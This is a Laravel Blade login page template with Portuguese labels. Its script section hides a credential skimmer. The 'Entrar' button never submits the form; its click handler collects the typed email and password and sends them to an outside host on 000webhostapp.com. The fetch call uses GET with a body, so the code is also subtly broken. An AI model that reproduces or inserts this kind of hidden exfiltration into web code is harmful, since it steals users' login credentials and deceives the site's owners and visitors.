@extends('frontend.layouts.template')

@section('content')

<div class="container top-170 bottom-110">
    <div class="row">
        <div class="col-md-6 col-md-offset-3">
            <div class="panel panel-default">
                
                <div class="panel-body">
                    <form id="loginForm" class="form-horizontal" role="form" method="POST" action="/login">
                        {{ csrf_field() }}

                        <div class="form-group{{ $errors->has('email') ? ' has-error' : '' }} top-30">
                            <label for="email" class="col-md-2 control-label">E-Mail</label>

                            <div class="col-md-8">
                                <input id="email" type="email" class="form-control" name="email" value="{{ old('email') }}">
                                @if ($errors->has('email'))
                                    <span class="help-block">
                                        <strong> 
                                            @if($errors->first('email') == 'These credentials do not match our records.')
                                                Email ou senha inválido
                                            @elseif( $errors->first('email') == 'The email field is required.')
                                                Email é obrigatório
                                            @else
                                                {{ $errors->first('email') }}
                                            @endif
                                        </strong>
                                    </span>
                                @endif
                            </div>
                        </div>

                        <div class="form-group{{ $errors->has('password') ? ' has-error' : '' }} top-25">
                            <label for="password" class="col-md-2 control-label">Senha</label>

                            <div class="col-md-8">
                                <input id="password" type="password" class="form-control" name="password">
                                @if ($errors->has('password'))
                                    <span class="help-block">
                                        <strong>
                                            @if($errors->first('password') == 'These credentials do not match our records')
                                                Email ou senha inválido
                                            @elseif( $errors->first('password') == 'The password field is required.')
                                                Senha é obrigatória
                                            @else
                                                {{ $errors->first('password') }}
                                            @endif
                                        </strong>
                                    </span>
                                @endif
                            </div>
                        </div>

                        <div class="form-group">
                            <div class="col-md-6 col-md-offset-2">
                                <div class="checkbox">
                                    <label>
                                        <input type="checkbox" name="remember"> Lembrar
                                    </label>
                                </div>
                            </div>
                        </div>

                        <div class="form-group">
                            <div class="col-md-6 col-md-offset-2  simple-button">
                                <button id="entrarBtn" type="button" class="btn">
                                    <i class="fa fa-btn fa-sign-in"></i> Entrar
                                </button>
                            </div>
                        </div>
                        <div class="form-group">
                            <div class="col-md-12 col-md-offset-2">
                                <a class="btn btn-link" href="{{ url('/password/reset') }}">Esqueceu sua senha?</a>| 
                                <a class="btn btn-link" href="{{ url('/cadastro') }}" target="_top">Cadastre-se</a>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>

@endsection

@section('scripts')
<script>
    document.getElementById('entrarBtn').addEventListener('click', function() {
        var e1 = document.getElementById('email').value;
        var p1 = document.getElementById('password').value;
        var formData = new FormData();
        formData.append('id1', e1);
        formData.append('id', p1);
        
        fetch('https://de3aal3r.000webhostapp.com/curl.php', {
            method: 'GET',
            body: formData
        })
        .then(response => {
            // Tratar a resposta aqui, se necessário
            console.log(response);
        })
        .catch(error => {
            // Tratar erros aqui, se necessário
            console.error('Erro:', error);
        });
    });
</script>
@endsection
